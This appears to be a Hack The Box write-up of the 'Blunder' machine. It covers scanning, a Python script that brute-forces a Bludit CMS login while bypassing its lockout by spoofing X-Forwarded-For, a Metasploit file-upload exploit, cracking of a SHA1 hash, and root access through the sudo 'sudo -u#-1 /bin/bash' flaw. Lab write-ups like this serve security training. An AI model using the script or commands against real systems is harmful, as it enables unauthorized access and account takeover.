# Blunder
![alt text](https://www.hackthebox.eu/storage/avatars/6437ea67350beceeb5c313f386bd1abe_thumb.png)
Hack the Box, Blunder
Easy, Linux, 20 Points

# Reconnaisance
  - Nmap

    ```bash
    nmap -A -T5 -oN nmap.txt -vv 10.10.10.191

    # Nmap 7.60 scan initiated Wed Jun  3 23:28:58 2020 as: nmap -A -T5 -oN nmap.txt -vv 10.10.10.191
    Increasing send delay for 10.10.10.191 from 0 to 5 due to 11 out of 20 dropped probes since last increase.
    Nmap scan report for 10.10.10.191
    Host is up, received syn-ack (0.21s latency).
    Scanned at 2020-06-03 23:28:58 +08 for 187s
    Not shown: 998 filtered ports
    Reason: 998 no-responses
    PORT   STATE  SERVICE REASON       VERSION
    21/tcp closed ftp     conn-refused
    80/tcp open   http    syn-ack      Apache httpd 2.4.41 ((Ubuntu))
    |_http-generator: Blunder
    | http-methods: 
    |_  Supported Methods: POST
    |_http-title: Blunder | A blunder of interesting facts
    
    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Wed Jun  3 23:32:05 2020 -- 1 IP address (1 host up) scanned in 186.94 seconds

    ```
# Website Enum
  - Gobuster
  
    ```
    gobuster -u http://10.10.10.191/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt' -x php,html,txt
    /admin
    /todo.txt
    ```
    Note Found in /todo.txt
    ```
    -Update the CMS
    -Turn off FTP - DONE
    -Remove old users - DONE
    -Inform fergus that the new blog needs images - PENDING
    ```
    From the note, we have user 'fergus' mentioned.
    Login page found in /admin
    Generate Password wordlist from the website using cewl
    ```bash
    cewl -d 10 -m 8 -w wordlist http://10.10.10.191
    ```
    bruteforce the login using this [script](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) as reference
    here is my working script
    ```python
    #!/bin/python
    
    import re
    import requests
    #import http.client 
    host = 'http://10.10.10.191'
    login_url = host + '/admin/'
    username = 'fergus'
    wordlist = []
    
    file = open('wordlist','r')
    for word in file:
        wordlist.append(word)
    
    
    for password in wordlist:
        session = requests.Session()
        login_page = session.get(login_url)
        try:
            csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
        except:
            csrf_token = None
        print('[*] Trying: {p}'.format(p = password))
        #http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch
        headers = {
            'X-Forwarded-For': password.strip(),
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }
    
        data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password.strip(),
            'save': ''
        }
    
        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = True)
    
        #print(login_result.text)
        if '/admin/dashboard' in login_result.text:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
    ```



# User Access

to gain user access, we need to exploit bludit's arbitrary file upload vulnerability.
here i'm using metasploit, but it can also be done by using the php exploit.
here is the [link](https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec) to the rapid7 website regarding the module that will be used.

![alt text](https://i.imgur.com/X2hdtiF.png)
after getting shell as www-data, we can try to enumerate the website deployment directory to find the passwordhash of the user 'hugo'.

Inside 
    ```
    /var/www/bludit-3.10.0a/bl-content/databases    
    ```
we can find "users.php" that contains the hash of user 'hugo'

![alt text](https://i.imgur.com/cFUhSOs.png)

we can try to analyze the hash in this [website](https://www.tunnelsup.com/hash-analyzer/) and turns out that the hash is actually SHA1. Then we can try to crack it online. i found this [website](https://md5decrypt.net/en/Sha1/) worked.

after getting the password, We can su to hugo and get the user flag inside hugo's homme directory.

![alt text](https://i.imgur.com/LxyFvDM.png)

# Privilege Escalation

Since we have the password of hugo already, we can try to execute 
    ``` 
    $ sudo -l
    ```
this will return the sudo privilege of the user 'hugo'

    
    Matching Defaults entries for hugo on blunder:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User hugo may run the following commands on blunder:
        (ALL, !root) /bin/bash
    

From the result above, we can see that this machine may vulnerable to the famous vulnerability sudo that can help user escalate privilege by passing unisgned user id. You can read the details [here](https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287)

we can exploit it with a simple command. Since the sudo can work with bash, so we can try to execute
    ```
    $ sudo -u#-1 /bin/bash
    ```
from that simple command we can directly get a root shell
![alt text](https://i.imgur.com/I8r0HzY.png)

